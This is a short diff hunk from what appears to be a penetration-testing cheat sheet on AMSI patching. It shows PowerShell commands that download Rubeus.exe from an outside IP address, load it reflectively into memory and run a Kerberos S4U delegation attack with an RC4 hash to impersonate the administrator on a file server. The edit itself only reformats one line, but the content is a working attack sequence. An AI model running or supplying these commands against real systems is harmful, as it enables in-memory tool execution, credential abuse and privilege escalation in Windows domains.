@@ -133,7 +133,7 @@ Run AMSI patching
 Powershell Load EXE:
 ```
 PS C:\Windows\system32> $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/Rubeus.exe')
-$assem = [System.Reflection.Assembly]::Load($data)
+PS C:\Windows\system32> $assem = [System.Reflection.Assembly]::Load($data)
 PS C:\Windows\system32> [Rubeus.Program]::Main("s4u /user:web01$ /rc4:12343649cc8ce713962859a2934b8cbb /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
 ```
 
